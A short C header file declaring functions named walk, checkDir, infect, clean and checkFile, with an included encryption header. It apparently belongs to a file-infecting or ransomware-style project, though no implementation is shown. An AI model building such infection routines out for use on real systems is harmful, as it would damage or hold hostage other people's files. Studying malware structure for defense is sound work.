#include <stdint.h>
#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <stdlib.h>
#include "../encryption/encryption.h"

void walk(const char *rootPath, int option);
void checkDir(DIR *dir);
void infect(char *filePath);
void clean(char *filePath);
int checkFile(char *filePath);
